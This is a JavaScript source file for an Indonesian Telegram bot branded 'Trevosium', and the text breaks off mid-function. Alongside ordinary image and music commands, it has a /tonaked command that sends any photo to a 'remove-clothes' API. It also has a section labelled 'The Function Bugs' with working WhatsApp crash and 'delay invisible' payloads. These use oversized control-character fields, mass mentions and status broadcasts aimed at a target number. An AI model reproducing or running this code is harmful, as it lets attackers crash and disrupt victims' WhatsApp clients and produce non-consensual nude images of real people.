          "⎈ Gagal memproses gambar. Pastikan URL atau foto valid."
        ).catch(() => {});
      }
      return;
    }

    if (status) {
      await ctx.telegram.deleteMessage(chatId, status.message_id).catch(() => {});
    }

    await ctx.replyWithPhoto(hasil, {
      caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴛʀᴇᴠᴏꜱɪᴜᴍ`,
      parse_mode: "Markdown",
    }).catch(() => {});
  } catch (e) {
    console.error("❌ /toanime error:", e.message);
    if (status) {
      await ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        undefined,
        "⎈ Terjadi kesalahan saat memproses gambar."
      ).catch(() => {});
    }
  }
});

bot.command("tonaked", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from?.id;
  const pengirim = ctx.from;

  if (!chatId || !userId) return;

  const text = ctx.message?.text || "";
  const urlArg = text.split(" ").slice(1).join(" ").trim();

  let imageUrl = urlArg || null;

  // ===== ambil foto dari reply =====
  if (!imageUrl && ctx.message?.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];
    try {
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      imageUrl = fileLink.href;
    } catch {
      imageUrl = null;
    }
  }

  if (!imageUrl) {
    return ctx.reply(
      "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tonaked"
    ).catch(() => {});
  }

  const status = await ctx.reply("⌭ Memproses gambar...")
    .catch(() => null);

  try {
    // ===== panggil API =====
    const res = await fetch(
      `https://api.nekolabs.web.id/style-changer/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json().catch(() => ({}));
    const hasil = data?.result || null;

    if (!hasil) {
      if (status) {
        await ctx.telegram.editMessageText(
          chatId,
          status.message_id,
          undefined,
          "⎈ Gagal memproses gambar. Pastikan URL atau foto valid."
        ).catch(() => {});
      }
      return;
    }

    if (status) {
      await ctx.telegram.deleteMessage(chatId, status.message_id).catch(() => {});
    }

    await ctx.replyWithPhoto(hasil, {
      caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴛʀᴇᴠᴏꜱɪᴜᴍ`,
      parse_mode: "Markdown",
    }).catch(() => {});
  } catch (e) {
    console.error("❌ /tonaked error:", e.message);
    if (status) {
      await ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        undefined,
        "⎈ Terjadi kesalahan saat memproses gambar."
      ).catch(() => {});
    }
  }
});

bot.command("tofigure", async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const pengirim = ctx.from;
    const text = ctx.message.text || "";
    const args = text.split(" ").slice(1).join(" ").trim();

    let imageUrl = args || null;

    if (!imageUrl && ctx.message.reply_to_message?.photo) {
      const photo = ctx.message.reply_to_message.photo;
      const fileId = photo[photo.length - 1].file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      imageUrl = fileLink.href;
    }

    if (!imageUrl) {
      return ctx.reply("⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tofigure");
    }

    const status = await ctx.reply("⌭ Mengubah gambar ke mode Figure...");

    const res = await fetch(
      `https://api.nekolabs.web.id/style.changer/figure?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json();
    const hasil = data?.result;

    if (!hasil) {
      return ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        null,
        "⎈ Gagal memproses gambar."
      );
    }

    await ctx.telegram.deleteMessage(chatId, status.message_id);

    await ctx.replyWithPhoto(hasil, {
      caption: `\`\`\`
⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
\`\`\``,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    await ctx.reply("⎈ Terjadi kesalahan saat memproses gambar.");
  }
});

bot.command("getcode", async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!url) {
      return ctx.reply("🪧 ☇ Format: /getcode https://example.com");
    }

    if (!/^https?:\/\/.+/i.test(url)) {
      return ctx.reply("❌ ☇ Url tidak valid!");
    }

    const loading = await ctx.reply("⏳ ☇ Tunggu sebentar...");

    // ===== HEAD CHECK =====
    let contentType = "";
    try {
      const headRes = await fetch(url, { method: "HEAD" });
      contentType = headRes.headers.get("content-type") || "";
    } catch {}

    const extMatch = url.match(/\.(\w+)$/i);
    const ext = extMatch ? extMatch[1].toLowerCase() : "";

    const isHTML =
      contentType.includes("text/html") ||
      ext === "html" ||
      ext === "";

    // ================= HTML WEBSITE =================
    if (isHTML) {
      const res = await fetch(url);
      const html = await res.text();

      const tmpDir = path.join("./tmp", `site-${Date.now()}`);
      fs.mkdirSync(tmpDir, { recursive: true });
      fs.writeFileSync(path.join(tmpDir, "index.html"), html);

      const $ = cheerio.load(html);
      const resources = new Set();

      $("link[href], script[src], img[src]").each((_, el) => {
        const attr = $(el).attr("href") || $(el).attr("src");
        if (!attr || attr.startsWith("data:")) return;

        try {
          resources.add(new URL(attr, url).href);
        } catch {}
      });

      for (const resUrl of resources) {
        try {
          const fileRes = await fetch(resUrl);
          if (!fileRes.ok) continue;

          const buffer = await fileRes.arrayBuffer();
          const name = path.basename(resUrl.split("?")[0]);
          fs.writeFileSync(path.join(tmpDir, name), Buffer.from(buffer));
        } catch {}
      }

      const zip = new AdmZip();
      zip.addLocalFolder(tmpDir);

      const zipPath = path.join("./tmp", `source-${Date.now()}.zip`);
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({
        source: zipPath,
        filename: "source.zip"
      });

      fs.rmSync(tmpDir, { recursive: true, force: true });
      fs.unlinkSync(zipPath);

      await ctx.telegram.editMessageText(
        chatId,
        loading.message_id,
        null,
        "✅ ☇ Website berhasil dikumpulkan & dikirim sebagai ZIP."
      );

    // ================= SINGLE FILE =================
    } else {
      const res = await fetch(url);
      if (!res.ok) throw new Error(`Status ${res.status}`);

      const buffer = await res.arrayBuffer();
      const extFile = ext || "txt";
      const fileName = `code-${Date.now()}.${extFile}`;

      fs.mkdirSync("./tmp", { recursive: true });
      const filePath = path.join("./tmp", fileName);
      fs.writeFileSync(filePath, Buffer.from(buffer));

      await ctx.replyWithDocument({
        source: filePath,
        filename: fileName
      });

      fs.unlinkSync(filePath);

      await ctx.telegram.editMessageText(
        chatId,
        loading.message_id,
        null,
        "☇ File tunggal berhasil diunduh dan dikirim."
      );
    }

  } catch (err) {
    console.error("GETCODE ERROR:", err);
    try {
      await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil source code.");
    } catch {}
  }
});

bot.command("brat", async (ctx) => {
  try {
    const textInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
    const chatId = ctx.chat.id;

    if (!textInput) {
      return ctx.reply(
        "```⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙄𝙈𝘼𝙂𝙀\n✘ Format salah!\n\n☬ Cara pakai:\n/brat teks\n\n⎙ Contoh:\n/brat Halo Dunia```",
        { parse_mode: "Markdown" }
      );
    }

    const loadingMsg = await ctx.reply(
      "```⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Membuat gambar teks...```",
      { parse_mode: "Markdown" }
    );

    const url = `https://brat.siputzx.my.id/image?text=${encodeURIComponent(textInput)}&emojiStyle=apple`;
    const res = await fetch(url);
    const buffer = Buffer.from(await res.arrayBuffer());

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Gambar teks berhasil dibuat.",
        parse_mode: "Markdown"
      }
    );

    ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

  } catch (e) {
    console.error("BRAT ERROR:", e);
    ctx.reply(
      "```⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat gambar.```",
      { parse_mode: "Markdown" }
    );
  }
});

const playing = new Map();

bot.command("play", async (ctx) => {
  const chatId = ctx.chat.id;
  const reply = ctx.message.reply_to_message;

  const query =
    ctx.message.text.replace(/^\/play\s*/i, "").trim() ||
    txt(reply);

  if (!query) {
    return ctx.reply("🎧 Ketik judul atau reply judul/link");
  }

  const infoMsg = await ctx.reply("🎧 Proses pencarian...");

  try {
    const isLink = /^https?:\/\/(youtube\.com|youtu\.be)/i.test(query);
    const candidates = isLink
      ? [{ url: query, title: query }]
      : await topVideos(query);

    if (!candidates.length) {
      return ctx.reply("❌ Tidak ada hasil ditemukan");
    }

    const ytUrl = normalizeYouTubeUrl(candidates[0].url);
    if (!ytUrl.includes("watch?v=")) {
      return ctx.reply("❌ Video YouTube tidak valid");
    }

    const apiUrl =
      "https://api.nekolabs.web.id/downloader/youtube/v1?" +
      new URLSearchParams({
        url: ytUrl,
        format: "mp3",
        quality: "128",
        type: "audio"
      });

    const res = await axios.get(apiUrl, { timeout: 60000 });
    const data = res.data;

    if (!data?.success || !data?.result?.downloadUrl) {
      return ctx.reply("❌ Gagal mengambil audio");
    }

    const file = await downloadToTemp(data.result.downloadUrl);
    await ctx.replyWithAudio(
      { source: file },
      {
        title: data.result.title,
        performer: "TREVOSIUM GHOST MUSIC",
        caption: `🎧 ${data.result.title}`
      }
    );

    cleanup(file);
    await ctx.deleteMessage(infoMsg.message_id).catch(() => {});

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan saat memproses audio");
  }
});

// The Function Bugs

//====( Blank Documents )====\\

async function otaxnewdocu(sock, target) {
console.log(chalk.red(`𝗧𝗿𝗲𝘃𝗼𝘀𝗶𝘂𝗺 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let docu = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "8bm4IyAXVv+iqbrtXIJ32ZgCL6al2mnpewvrMwrqSz8=",
    "fileLength": "999999999",
    "pageCount": 92828282882,
    "mediaKey": "5y/wRwOnBCEEMh6pBBNztHFAROZDvBEuX6lZI3orfQE=",
    "fileName": "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎.pdf",
    "fileEncSha256": "YgCZHWxMaT0PNGhbyPJvIqeEdicCUeJF7ooUgz3VVyY=",
    "directPath": "/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752349203",
    "contactVcard": true,
    "thumbnailDirectPath": "/v/t62.36145-24/30978706_624564333438537_9140700599826117621_n.enc?ccb=11-4&oh=01_Q5Aa2AEuw_7H8iAXcpyYOnG8a_u8lGKh-YjLq4XAzWQvsXQlzw&oe=689A2103&_nc_sid=5e03e0",
    "thumbnailSha256": "xPYGe7EjjF+blg7XiQr8G2emJFmMbyOrSVZIW0WJxuo=",
    "thumbnailEncSha256": "BT9gu5nq/bR0TvUJnrscK8/RW+24cNMy1VGILh0zUdk=",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
    "contextInfo": {
      "expiration": 1,
      "ephemeralSettingTimestamp": 1,
      "forwardingScore": 9999,
      "isForwarded": true,
      "remoteJid": "status@broadcast",
      "disappearingMode": {
        "initiator": "INITIATED_BY_OTHER",
        "trigger": "UNKNOWN_GROUPS"
      },
      "StatusAttributionType": 1,
      "forwardedAiBotMessageInfo": {
         "botName": "Meta",
          "botJid": "13135550002@s.whatsapp.net",
          "creatorName": "trevosium"
      },
      "externalAdReply": {
          "showAdAttribution": false,
          "renderLargerThumbnail": true
      },
      "quotedMessage": {
        "paymentInviteMessage": {
          "serviceType": 1,
          "expiryTimestamp": null
        }
      }
    },
    "thumbnailHeight": 480,
    "thumbnailWidth": 339,
    "caption": "ꦽ".repeat(150000)
  }
	}), { participant: { jid: target }
});

  await sock.relayMessage(target, docu.message, { messageId: docu.key.id });
}
async function otaxnewdocu2(sock, target) {
console.log(chalk.red(`𝗧𝗿𝗲𝘃𝗼𝘀𝗶𝘂𝗺 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let docu = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "8bm4IyAXVv+iqbrtXIJ32ZgCL6al2mnpewvrMwrqSz8=",
    "fileLength": "999999999",
    "pageCount": 92828282882,
    "mediaKey": "5y/wRwOnBCEEMh6pBBNztHFAROZDvBEuX6lZI3orfQE=",
    "fileName": "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕿𝖗𝖊𝖛𝖔𝖘𝖎𝖚𝖒 𝖂𝖆𝖗𝖓𝖎𝖓𝖌𝖘∮⸙⸎.pdf",
    "fileEncSha256": "YgCZHWxMaT0PNGhbyPJvIqeEdicCUeJF7ooUgz3VVyY=",
    "directPath": "/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752349203",
    "contactVcard": true,
    "thumbnailDirectPath": "/v/t62.36145-24/30978706_624564333438537_9140700599826117621_n.enc?ccb=11-4&oh=01_Q5Aa2AEuw_7H8iAXcpyYOnG8a_u8lGKh-YjLq4XAzWQvsXQlzw&oe=689A2103&_nc_sid=5e03e0",
    "thumbnailSha256": "xPYGe7EjjF+blg7XiQr8G2emJFmMbyOrSVZIW0WJxuo=",
    "thumbnailEncSha256": "BT9gu5nq/bR0TvUJnrscK8/RW+24cNMy1VGILh0zUdk=",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
    "contextInfo": {
      "expiration": 1,
      "ephemeralSettingTimestamp": 1,
      "forwardingScore": 9999,
      "isForwarded": true,
      "remoteJid": "status@broadcast",
      "disappearingMode": {
        "initiator": "INITIATED_BY_OTHER",
        "trigger": "UNKNOWN_GROUPS"
      },
      "StatusAttributionType": 1,
      "forwardedAiBotMessageInfo": {
         "botName": "Meta",
          "botJid": "13135550002@s.whatsapp.net",
          "creatorName": "trevosium"
      },
      "externalAdReply": {
          "showAdAttribution": false,
          "renderLargerThumbnail": true
      },
      "quotedMessage": {
        "paymentInviteMessage": {
          "serviceType": 1,
          "expiryTimestamp": null
        }
      }
    },
    "thumbnailHeight": 480,
    "thumbnailWidth": 339,
    "caption": "ꦾ".repeat(150000)
  }
	}), { participant: { jid: target }
});

  await sock.relayMessage(target, docu.message, { messageId: docu.key.id });
}



//=====( Delay Invisible )====\\

async function gsIntjavgb(sock, target, otaxkiw = true) {
  for (let i = 0; i < 20; i++) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "12037205250208@newsletter",
            newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
            serverMessageId: 1000,
            accessibilityText: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\x10".repeat(1000000),
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await sock.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
    })
  }
}

async function OtaxAyunBelovedX(sock, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "999999"),
    }
  );

  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let sequentialIndex = 0;
  console.log(chalk.red(`Succes Sending Bug DelayInvis To ${target}`));

  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from(
        { length: 300 },
        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
      ),
    ],
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  const msgxayy = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  let interxnxx = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
      contentText: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
      footerText: "InvisibleHard嗉�",
      buttons: [
        {
          buttonId: ".bugs",
          buttonText: {
            displayText: "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  const statusMessages = [stickerMsg, msgxay, msgxayy];

  const content = {
    extendedTextMessage: {
      text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "\x15".repeat(30000),
      matchedText: "\u0005".repeat(20000),
      description: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
      title: "\u0000".repeat(20000),
      previewType: "NONE",
      jpegThumbnail:
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 300 },
            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName:
              "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "\x15".repeat(10000),
            caption:
              "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" +
              "\u0002".repeat(60000) +
              "\u0005".repeat(60000),
            inviteExpiration: "999999999",
          },
        },
        forwardedNewsletterMessageInfo: {
          newsletterName:
            "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "ꦾ".repeat(6590),
          newsletterJid: "13135550002@newsletter",
          serverId: 1,
        },
      },
    },
  };

  const xnxxmsg = generateWAMessageFromContent(target, content, {});

  for (let i = 0; i < 1; i++) {
    await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", interxnxx.message, {
      messageId: interxnxx.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      });
    }

    if (i < 99) {
      await new Promise((resolve) => setTimeout(resolve, 4000));
    }
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: xnxxmsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function invisibledelaynew(sock, target) {
    const mentionedJids = Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`);
    const newsletterJid = "1@newsletter";
    const juleku = Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net");

    const xwar = {
        ephermalMessage: {
            body: { text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유", format: "DEFAULT" },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
            },
            entryPointConversionSource: "p"
        },
        contextInfo: {
            mentionedJid: juleku,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유"
            }
        },
        nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{}".repeat(30000),
            version: 3
        }
    };

    const war = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유 ", format: "EXTENTION_1" },
                    contextInfo: {
                        mentionedJid: mentionedJids,
                        statusAttributionType: "SHARED_FROM_MENTION"
                    },
